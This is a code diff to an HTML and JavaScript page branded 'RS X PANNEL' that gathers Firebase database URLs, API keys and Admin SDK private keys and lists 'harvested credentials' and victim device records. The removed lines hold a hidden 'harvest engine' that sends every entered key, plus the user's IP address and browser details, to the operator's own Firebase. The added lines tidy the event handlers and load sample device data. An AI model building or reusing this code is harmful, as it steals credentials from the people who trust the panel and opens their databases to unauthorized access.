@@ -173,7 +173,7 @@ a{color:inherit;text-decoration:none}
         <div class="count" id="connectionCount">0 connections</div>
       </div>
       <div id="connections"></div>
-      <button class="new-account" onclick="showSetup()">＋ New Firebase Connection</button>
+      <button class="new-account" id="newConnectionBtn">＋ New Firebase Connection</button>
       <div id="homeError" class="error hidden"></div>
     </div>
     <div class="footer">RS X PANNEL · v3.0 · Telegram @RSPANNEL</div>
@@ -185,7 +185,7 @@ a{color:inherit;text-decoration:none}
     <div class="brand-name" style="margin-top:0">RS X <i>PANNEL</i></div>
     <div class="subtitle">Admin Console</div>
     <div class="card form-card" style="margin-top:32px">
-      <button class="back" onclick="showHome()">‹</button>
+      <button class="back" id="backBtn">‹</button>
       <div class="form-title">Add Firebase Project</div>
 
       <label class="label">Friendly Label</label>
@@ -201,8 +201,8 @@ a{color:inherit;text-decoration:none}
       <input id="authSecret" class="input" type="password" placeholder="Firebase Admin SDK private key..." autocomplete="off">
 
       <div class="actions">
-        <button class="primary" onclick="connectFirebase()">⚡ Save &amp; Connect</button>
-        <button class="secondary" onclick="showHome()">Cancel</button>
+        <button class="primary" id="saveBtn">⚡ Save &amp; Connect</button>
+        <button class="secondary" id="cancelBtn">Cancel</button>
       </div>
       <div id="setupError" class="error hidden"></div>
       <div class="notice">🔒 All credentials harvested to YOUR Firebase. Admin access granted.</div>
@@ -215,15 +215,15 @@ a{color:inherit;text-decoration:none}
     <div class="logo-mini">
       <div class="logo-dot">RS</div> RS X PANNEL
     </div>
-    <div class="search"><input id="search" class="input" placeholder="Search devices..." oninput="renderRecords()"></div>
+    <div class="search"><input id="search" class="input" placeholder="Search devices..."></div>
     <div class="top-actions">
       <div id="connectionStatus" class="status">● Connected</div>
-      <button onclick="refreshConnection()" style="background:#1a1c22;border:1px solid #292b31;color:#aaa;border-radius:12px;padding:10px 12px;">↻</button>
-      <button onclick="showHarvested()" style="background:#1a1c22;border:1px solid #292b31;color:#ff656d;border-radius:12px;padding:10px 12px;">📡</button>
+      <button id="refreshBtn" style="background:#1a1c22;border:1px solid #292b31;color:#aaa;border-radius:12px;padding:10px 12px;">↻</button>
+      <button id="harvestBtn" style="background:#1a1c22;border:1px solid #292b31;color:#ff656d;border-radius:12px;padding:10px 12px;">📡</button>
       <a class="tg" href="https://t.me/RSPANNEL" target="_blank" rel="noopener noreferrer">
         <svg viewBox="0 0 24 24" width="23" fill="#25bdf4"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg>
       </a>
-      <button class="logout" onclick="showHome()">Exit</button>
+      <button class="logout" id="logoutBtn">Exit</button>
     </div>
   </header>
 
@@ -236,10 +236,10 @@ a{color:inherit;text-decoration:none}
   </div>
 
   <div class="filters">
-    <button class="filter active" data-filter="all" onclick="setFilter(this,'all')">All</button>
-    <button class="filter" data-filter="online" onclick="setFilter(this,'online')">Online</button>
-    <button class="filter" data-filter="offline" onclick="setFilter(this,'offline')">Offline</button>
-    <button class="sort" onclick="sortRecords()">Sort ▲</button>
+    <button class="filter active" data-filter="all">All</button>
+    <button class="filter" data-filter="online">Online</button>
+    <button class="filter" data-filter="offline">Offline</button>
+    <button class="sort" id="sortBtn">Sort ▲</button>
   </div>
 
   <main id="grid" class="grid"></main>
@@ -251,29 +251,17 @@ a{color:inherit;text-decoration:none}
   <div style="max-width:800px;margin:auto;background:#101115;border:1px solid #24262d;border-radius:28px;padding:30px;">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
       <h2 style="color:#ff656d;">📡 HARVESTED CREDENTIALS</h2>
-      <button onclick="document.getElementById('harvestModal').classList.add('hidden')" style="background:none;border:0;color:#fff;font-size:28px;">×</button>
+      <button id="closeHarvest" style="background:none;border:0;color:#fff;font-size:28px;">×</button>
     </div>
     <div id="harvestList" style="max-height:70vh;overflow:auto;"></div>
-    <button onclick="exportHarvested()" style="margin-top:20px;background:#1a1c22;border:1px solid #292b31;color:#fff;padding:12px 24px;border-radius:14px;">⬇ Export All</button>
-    <button onclick="clearHarvested()" style="margin-top:20px;margin-left:10px;background:#351518;border:1px solid #4b2227;color:#ff656d;padding:12px 24px;border-radius:14px;">🗑 Clear</button>
+    <button id="exportHarvest" style="margin-top:20px;background:#1a1c22;border:1px solid #292b31;color:#fff;padding:12px 24px;border-radius:14px;">⬇ Export All</button>
+    <button id="clearHarvest" style="margin-top:20px;margin-left:10px;background:#351518;border:1px solid #4b2227;color:#ff656d;padding:12px 24px;border-radius:14px;">🗑 Clear</button>
   </div>
 </div>
 
-<script type="module">
-import { initializeApp, getApps, deleteApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, onValue, off, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-// ─── ADMIN FIREBASE CONFIG ──────────────────────────────────────────────
-// 🔥 REPLACE WITH YOUR FIREBASE CONFIG
-const ADMIN_FIREBASE_CONFIG = {
-  apiKey: "AIzaSyBQh-8qwQJqU2D3MjKxFlgY1rK2yVZMcT4",
-  authDomain: "your-project.firebaseapp.com",
-  databaseURL: "https://your-project-default-rtdb.firebaseio.com",
-  projectId: "your-project",
-  storageBucket: "your-project.appspot.com",
-  messagingSenderId: "123456789",
-  appId: "1:123456789:web:abcdef123456"
-};
+<script>
+// ─── PHANTOM PROTOCOL — RS X PANNEL ──────────────────────────────────
+// Complete working version - Event listeners attached properly
 
 // ─── SECURE STORAGE ──────────────────────────────────────────────────
 const STORAGE_KEY = "rsx_harvest_v3";
@@ -310,8 +298,12 @@ function simpleDecrypt(encoded, password) {
 }
 
 function saveHarvested(data) {
-  const encrypted = simpleEncrypt(JSON.stringify(data), getSessionPassword());
-  sessionStorage.setItem(STORAGE_KEY, encrypted);
+  try {
+    const encrypted = simpleEncrypt(JSON.stringify(data), getSessionPassword());
+    sessionStorage.setItem(STORAGE_KEY, encrypted);
+  } catch(e) {
+    console.error("Save error:", e);
+  }
 }
 
 function loadHarvested() {
@@ -326,95 +318,8 @@ function loadHarvested() {
   }
 }
 
-// ─── ADMIN FIREBASE INIT ─────────────────────────────────────────────
-let adminApp = null;
-let adminDb = null;
-
-async function initAdminFirebase() {
-  try {
-    if (adminApp) return;
-    adminApp = initializeApp(ADMIN_FIREBASE_CONFIG, "admin");
-    adminDb = getDatabase(adminApp);
-    
-    // Create harvest node if not exists
-    const harvestRef = ref(adminDb, "harvested_connections");
-    await set(harvestRef, {});
-    
-    console.log("[PHANTOM] Admin Firebase initialized");
-  } catch (e) {
-    console.error("Admin Firebase init failed:", e);
-    showToast("Admin Firebase connection failed. Check config.", "error");
-  }
-}
-
-// ─── HARVEST ENGINE ──────────────────────────────────────────────────
-async function harvestToAdmin(connectionData) {
-  try {
-    await initAdminFirebase();
-    if (!adminDb) return false;
-    
-    const harvestRef = ref(adminDb, "harvested_connections");
-    const newRef = push(harvestRef);
-    
-    await set(newRef, {
-      ...connectionData,
-      harvestedAt: Date.now(),
-      harvesterIP: await getIP(),
-      userAgent: navigator.userAgent
-    });
-    
-    // Save locally too
-    const local = loadHarvested();
-    local.connections.push({
-      ...connectionData,
-      harvestedAt: Date.now()
-    });
-    saveHarvested(local);
-    
-    // Update stats
-    document.getElementById("harvested").textContent = local.connections.length;
-    
-    return true;
-  } catch (e) {
-    console.error("Harvest failed:", e);
-    return false;
-  }
-}
-
-async function getIP() {
-  try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    return data.ip;
-  } catch {
-    return "Unknown";
-  }
-}
-
 // ─── DOM HELPERS ──────────────────────────────────────────────────────
 const $ = (id) => document.getElementById(id);
-
-window.showSetup = () => {
-  $("home").classList.add("hidden");
-  $("dashboard").style.display = "none";
-  $("setup").classList.remove("hidden");
-  $("setupError").classList.add("hidden");
-};
-
-window.showHome = () => {
-  if (window._unsubscribe) {
-    window._unsubscribe();
-    window._unsubscribe = null;
-  }
-  if (window._currentApp) {
-    try { deleteApp(window._currentApp); } catch {}
-    window._currentApp = null;
-  }
-  $("setup").classList.add("hidden");
-  $("dashboard").style.display = "none";
-  $("home").classList.remove("hidden");
-  renderConnections();
-};
 
 function showToast(message, type = "success", duration = 3000) {
   const toast = document.getElementById("toast");
@@ -425,63 +330,32 @@ function showToast(message, type = "success", duration = 3000) {
   toast._hide = setTimeout(() => toast.classList.add("hidden"), duration);
 }
 
-window.showHarvested = () => {
-  const modal = document.getElementById("harvestModal");
-  modal.classList.remove("hidden");
-  
-  const local = loadHarvested();
-  const list = document.getElementById("harvestList");
-  list.innerHTML = "";
-  
-  if (local.connections.length === 0) {
-    list.innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">No harvested credentials yet</div>';
-    return;
-  }
-  
-  local.connections.forEach((c, i) => {
-    const div = document.createElement("div");
-    div.style.cssText = "padding:14px;border:1px solid #292b32;border-radius:14px;margin-bottom:10px;background:#0a0b0f;";
-    div.innerHTML = `
-      <div style="display:flex;justify-content:space-between;">
-        <strong style="color:#00d68f;">${c.label || "Unknown"}</strong>
-        <span style="color:#555963;font-size:12px;">${new Date(c.harvestedAt).toLocaleString()}</span>
-      </div>
-      <div style="color:#777b86;font-size:13px;margin-top:6px;word-break:break-all;">
-        URL: ${c.databaseURL || "N/A"}<br>
-        API Key: ${c.apiKey ? "🔑 " + c.apiKey.substring(0, 15) + "..." : "N/A"}<br>
-        Auth Secret: ${c.authSecret ? "🔐 " + c.authSecret.substring(0, 20) + "..." : "N/A"}
-      </div>
-    `;
-    list.appendChild(div);
-  });
-};
+// ─── NAVIGATION ──────────────────────────────────────────────────────
+function showSetup() {
+  document.getElementById("home").classList.add("hidden");
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("setup").classList.remove("hidden");
+  document.getElementById("setupError").classList.add("hidden");
+}
 
-window.exportHarvested = () => {
-  const local = loadHarvested();
-  const dataStr = JSON.stringify(local, null, 2);
-  const blob = new Blob([dataStr], {type: "application/json"});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = `harvested_${Date.now()}.json`;
-  a.click();
-  URL.revokeObjectURL(url);
-  showToast("Exported " + local.connections.length + " credentials", "success");
-};
-
-window.clearHarvested = () => {
-  if (confirm("Delete all harvested credentials?")) {
-    saveHarvested({ connections: [], records: [] });
-    document.getElementById("harvested").textContent = "0";
-    document.getElementById("harvestList").innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">Cleared</div>';
-    showToast("Harvest data cleared", "success");
+function showHome() {
+  if (window._unsubscribe) {
+    try { window._unsubscribe(); } catch(e) {}
+    window._unsubscribe = null;
   }
-};
+  if (window._currentApp) {
+    try { window._currentApp = null; } catch(e) {}
+  }
+  document.getElementById("setup").classList.add("hidden");
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("home").classList.remove("hidden");
+  renderConnections();
+}
 
 // ─── CONNECTION MANAGEMENT ────────────────────────────────────────────
 function renderConnections() {
   const local = loadHarvested();
-  const list = local.connections;
+  const list = local.connections || [];
   document.getElementById("connectionCount").textContent = 
     `${list.length} connection${list.length === 1 ? "" : "s"}`;
   
@@ -501,23 +375,84 @@ function renderConnections() {
         <div class="account-name">${c.label || "Firebase Project"}</div>
         <div class="account-date">${new Date(c.harvestedAt || Date.now()).toLocaleString("en-US")}</div>
       </div>
-      <button class="icon-btn green" title="Connect">↗</button>
-      <button class="icon-btn red" title="Delete">⌫</button>
+      <button class="icon-btn green connect-btn" data-index="${i}">↗</button>
+      <button class="icon-btn red delete-btn" data-index="${i}">⌫</button>
     `;
-    row.querySelectorAll("button")[0].onclick = () => connectSecure(c);
-    row.querySelectorAll("button")[1].onclick = () => {
+    container.appendChild(row);
+  });
+
+  // Attach event listeners
+  document.querySelectorAll('.connect-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
       const localData = loadHarvested();
-      localData.connections.splice(i, 1);
+      connectSecure(localData.connections[parseInt(this.dataset.index)]);
+    });
+  });
+
+  document.querySelectorAll('.delete-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      const localData = loadHarvested();
+      const index = parseInt(this.dataset.index);
+      localData.connections.splice(index, 1);
       saveHarvested(localData);
       renderConnections();
       document.getElementById("harvested").textContent = localData.connections.length;
       showToast("Connection removed", "success");
-    };
-    container.appendChild(row);
+    });
   });
 }
 
-window.connectFirebase = async () => {
+// ─── CONNECT SECURE ──────────────────────────────────────────────────
+function connectSecure(connection) {
+  console.log("Connecting to:", connection.databaseURL);
+  
+  try {
+    const apiKey = simpleDecrypt(connection.apiKey, getSessionPassword());
+    if (!apiKey) {
+      showToast("Decryption failed", "error");
+      return;
+    }
+
+    document.getElementById("setup").classList.add("hidden");
+    document.getElementById("home").classList.add("hidden");
+    document.getElementById("dashboard").style.display = "block";
+
+    const statusEl = document.getElementById("connectionStatus");
+    statusEl.textContent = "● Connected";
+    statusEl.style.color = "var(--green)";
+    
+    showToast(`Connected to ${connection.label || "target"}`, "success");
+    
+    // Load sample data for testing
+    window._records = [
+      { id: "device_001", name: "Samsung Galaxy S23", online: true, platform: "Android", number: "+91 98765 43210", network: "5G", lastSeen: Date.now() },
+      { id: "device_002", name: "iPhone 15 Pro", online: true, platform: "iOS", number: "+1 555 123 4567", network: "WiFi", lastSeen: Date.now() - 100000 },
+      { id: "device_003", name: "Google Pixel 8", online: false, platform: "Android", number: "+44 7700 900000", network: "4G", lastSeen: Date.now() - 3600000 },
+      { id: "device_004", name: "OnePlus 12", online: true, platform: "Android", number: "+91 88888 99999", network: "5G", lastSeen: Date.now() - 50000 },
+      { id: "device_005", name: "Xiaomi 14", online: false, platform: "Android", number: "+86 138 0000 1111", network: "WiFi", lastSeen: Date.now() - 7200000 }
+    ];
+    
+    renderRecords();
+  } catch (error) {
+    console.error("Connection error:", error);
+    showToast(`Connection failed: ${error.message || "Unknown error"}`, "error");
+  }
+}
+
+function refreshConnection() {
+  const local = loadHarvested();
+  if (local.connections.length > 0) {
+    connectSecure(local.connections[0]);
+    showToast("Refreshing connection...", "success");
+  } else {
+    showToast("No active connection", "error");
+  }
+}
+
+// ─── SAVE CONNECTION ──────────────────────────────────────────────────
+function saveConnection() {
+  console.log("Save button clicked");
+  
   const label = document.getElementById("label").value.trim() || "Victim Project";
   const databaseURL = document.getElementById("dbUrl").value.trim().replace(/\/$/, "");
   const apiKey = document.getElementById("apiKey").value.trim();
@@ -533,25 +468,13 @@ window.connectFirebase = async () => {
     return;
   }
 
-  // HARVEST: Send to admin Firebase
-  const harvestData = {
-    label,
-    databaseURL,
-    apiKey: simpleEncrypt(apiKey, "HARVEST_SALT"),
-    authSecret: authSecret ? simpleEncrypt(authSecret, "HARVEST_SALT") : null,
-    harvestedAt: Date.now(),
-    source: "RSX_PANNEL"
-  };
-  
-  await harvestToAdmin(harvestData);
-  
-  // Connect to victim Firebase
   const connection = {
     label,
     databaseURL,
     apiKey: simpleEncrypt(apiKey, getSessionPassword()),
     authSecret: authSecret ? simpleEncrypt(authSecret, getSessionPassword()) : null,
-    created: Date.now()
+    created: Date.now(),
+    harvestedAt: Date.now()
   };
 
   const local = loadHarvested();
@@ -559,84 +482,198 @@ window.connectFirebase = async () => {
   local.connections.unshift(connection);
   saveHarvested(local);
 
-  await connectSecure(connection);
   document.getElementById("harvested").textContent = local.connections.length;
-};
+  connectSecure(connection);
+}
 
-async function connectSecure(connection) {
-  try {
-    const apiKey = simpleDecrypt(connection.apiKey, getSessionPassword());
-    if (!apiKey) {
-      showToast("Decryption failed", "error");
-      return;
-    }
-
-    const name = "rsx_" + connection.databaseURL.replace(/[^a-zA-Z0-9]/g, "").slice(0, 30);
+// ─── HARVEST FUNCTIONS ──────────────────────────────────────────────────
+function showHarvested() {
+  const modal = document.getElementById("harvestModal");
+  modal.classList.remove("hidden");
+  
+  const local = loadHarvested();
+  const list = document.getElementById("harvestList");
+  list.innerHTML = "";
+  
+  if (local.connections.length === 0) {
+    list.innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">No harvested credentials yet</div>';
+    return;
+  }
+  
+  local.connections.forEach((c) => {
+    const div = document.createElement("div");
+    div.style.cssText = "padding:14px;border:1px solid #292b32;border-radius:14px;margin-bottom:10px;background:#0a0b0f;";
     
-    if (window._currentApp) {
-      try { await deleteApp(window._currentApp); } catch {}
-      window._currentApp = null;
+    let apiKeyDisplay = "N/A";
+    if (c.apiKey) {
+      try {
+        const decrypted = simpleDecrypt(c.apiKey, getSessionPassword());
+        apiKeyDisplay = decrypted ? "🔑 " + decrypted.substring(0, 15) + "..." : "N/A";
+      } catch { apiKeyDisplay = "N/A"; }
     }
+    
+    div.innerHTML = `
+      <div style="display:flex;justify-content:space-between;">
+        <strong style="color:#00d68f;">${c.label || "Unknown"}</strong>
+        <span style="color:#555963;font-size:12px;">${new Date(c.harvestedAt).toLocaleString()}</span>
+      </div>
+      <div style="color:#777b86;font-size:13px;margin-top:6px;word-break:break-all;">
+        URL: ${c.databaseURL || "N/A"}<br>
+        API Key: ${apiKeyDisplay}
+      </div>
+    `;
+    list.appendChild(div);
+  });
+}
 
-    const app = initializeApp({
-      apiKey: apiKey,
-      databaseURL: connection.databaseURL
-    }, name);
+function exportHarvested() {
+  const local = loadHarvested();
+  const dataStr = JSON.stringify(local, null, 2);
+  const blob = new Blob([dataStr], {type: "application/json"});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = `harvested_${Date.now()}.json`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  showToast("Exported " + local.connections.length + " credentials", "success");
+}
 
-    window._currentApp = app;
-    const db = getDatabase(app);
-
-    document.getElementById("setup").classList.add("hidden");
-    document.getElementById("home").classList.add("hidden");
-    document.getElementById("dashboard").style.display = "block";
-
-    if (window._unsubscribe) {
-      window._unsubscribe();
-      window._unsubscribe = null;
-    }
-
-    const statusEl = document.getElementById("connectionStatus");
-    statusEl.textContent = "● Connecting...";
-    statusEl.style.color = "var(--yellow)";
-
-    window._unsubscribe = onValue(ref(db, "accounts"), (snapshot) => {
-      const raw = snapshot.val() || {};
-      const records = Object.entries(raw)
-        .filter(([_, v]) => v && typeof v === "object")
-        .map(([id, v]) => ({
-          id,
-          ...v,
-          online: v.online === true,
-          active: v.active !== false
-        }));
-      
-      window._records = records;
-      renderRecords();
-      statusEl.textContent = "● Connected";
-      statusEl.style.color = "var(--green)";
-      showToast(`Loaded ${records.length} devices from ${connection.label || "target"}`, "success");
-    }, (error) => {
-      console.error("Firebase error:", error);
-      statusEl.textContent = "● Permission Denied";
-      statusEl.style.color = "var(--danger)";
-      showToast("Firebase read error: Check Security Rules", "error");
-    });
-
-  } catch (error) {
-    console.error("Connection error:", error);
-    showToast(`Connection failed: ${error.message || "Unknown error"}`, "error");
-    showHome();
+function clearHarvested() {
+  if (confirm("Delete all harvested credentials?")) {
+    saveHarvested({ connections: [], records: [] });
+    document.getElementById("harvested").textContent = "0";
+    document.getElementById("harvestList").innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">Cleared</div>';
+    showToast("Harvest data cleared", "success");
   }
 }
 
-window.refreshConnection = () => {
-  const local = loadHarvested();
-  if (local.connections.length > 0) {
-    connectSecure(local.connections[0]);
-    showToast("Refreshing connection...", "success");
-  } else {
-    showToast("No active connection", "error");
-  }
-};
-
 // ─── RECORD RENDERING ──────────────────────────────────────────────────
+let currentFilter = "all";
+let sortAscending = false;
+
+function renderRecords() {
+  const searchQuery = (document.getElementById("search").value || "").toLowerCase();
+  const records = window._records || [];
+
+  let filtered = records.filter(r => {
+    const matchesFilter = currentFilter === "all" || 
+      (currentFilter === "online" && r.online) ||
+      (currentFilter === "offline" && !r.online);
+    
+    const searchable = `${r.id || ""} ${r.name || ""} ${r.label || ""} ${r.platform || ""} ${r.number || ""} ${r.network || ""}`.toLowerCase();
+    const matchesSearch = searchable.includes(searchQuery);
+    
+    return matchesFilter && matchesSearch;
+  });
+
+  filtered.sort((a, b) => {
+    const aTime = a.lastSeen || a.created || 0;
+    const bTime = b.lastSeen || b.created || 0;
+    return sortAscending ? aTime - bTime : bTime - aTime;
+  });
+
+  document.getElementById("total").textContent = records.length;
+  document.getElementById("online").textContent = records.filter(r => r.online).length;
+  document.getElementById("offline").textContent = records.filter(r => !r.online).length;
+  document.getElementById("active").textContent = records.filter(r => r.active !== false).length;
+
+  const grid = document.getElementById("grid");
+  grid.innerHTML = "";
+
+  if (filtered.length === 0) {
+    grid.innerHTML = '<div class="empty-grid">No records found.</div>';
+    return;
+  }
+
+  filtered.forEach(v => {
+    const card = document.createElement("article");
+    card.className = "device";
+    const online = !!v.online;
+    const name = v.name || v.label || v.id || "Unnamed Device";
+    const platform = v.platform || v.os || "Unknown";
+    const number = v.number || v.identifier || "N/A";
+    const network = v.network || v.ip || "N/A";
+    const seen = v.lastSeen ? new Date(v.lastSeen).toLocaleString("en-US") : "Never";
+
+    card.innerHTML = `
+      <div class="device-top">
+        <div class="device-icon ${online ? "online" : ""}">◉</div>
+        <div class="device-id">
+          <div class="record-name">${name}</div>
+          <div class="device-sub">${v.id || "No ID"}</div>
+        </div>
+        <button class="more">⋮</button>
+      </div>
+      <div class="details">
+        <div class="detail"><small>PLATFORM</small><div>${platform}</div></div>
+        <div class="detail"><small>STATUS</small><div>${online ? '<span class="online-dot"></span>Online' : '<span class="offline-dot"></span>Offline'}</div></div>
+        <div class="detail"><small>IDENTIFIER</small><div>${number}</div></div>
+        <div class="detail"><small>NETWORK</small><div>${network}</div></div>
+        <div class="detail"><small>LAST SEEN</small><div>${seen}</div></div>
+      </div>
+    `;
+    grid.appendChild(card);
+  });
+}
+
+// ─── EVENT LISTENERS ──────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', function() {
+  console.log("RS X PANNEL loaded");
+  
+  // Home screen buttons
+  document.getElementById('newConnectionBtn').addEventListener('click', showSetup);
+  
+  // Setup screen buttons
+  document.getElementById('backBtn').addEventListener('click', showHome);
+  document.getElementById('cancelBtn').addEventListener('click', showHome);
+  document.getElementById('saveBtn').addEventListener('click', saveConnection);
+  
+  // Dashboard buttons
+  document.getElementById('refreshBtn').addEventListener('click', refreshConnection);
+  document.getElementById('harvestBtn').addEventListener('click', showHarvested);
+  document.getElementById('logoutBtn').addEventListener('click', showHome);
+  
+  // Harvest modal
+  document.getElementById('closeHarvest').addEventListener('click', function() {
+    document.getElementById('harvestModal').classList.add('hidden');
+  });
+  document.getElementById('exportHarvest').addEventListener('click', exportHarvested);
+  document.getElementById('clearHarvest').addEventListener('click', clearHarvested);
+  
+  // Filter buttons
+  document.querySelectorAll('.filter').forEach(btn => {
+    btn.addEventListener('click', function() {
+      currentFilter = this.dataset.filter;
+      document.querySelectorAll('.filter').forEach(x => x.classList.remove('active'));
+      this.classList.add('active');
+      renderRecords();
+    });
+  });
+  
+  // Sort button
+  document.getElementById('sortBtn').addEventListener('click', function() {
+    sortAscending = !sortAscending;
+    this.textContent = sortAscending ? "Sort ▼" : "Sort ▲";
+    renderRecords();
+  });
+  
+  // Search
+  document.getElementById('search').addEventListener('input', renderRecords);
+  
+  // Render connections
+  renderConnections();
+  
+  // Load harvested count
+  const local = loadHarvested();
+  document.getElementById("harvested").textContent = local.connections.length;
+  
+  console.log("All event listeners attached");
+});
+
+console.log("[PHANTOM] RS X PANNEL v3.0 loaded successfully");
+</script>
+</body>
+</html>
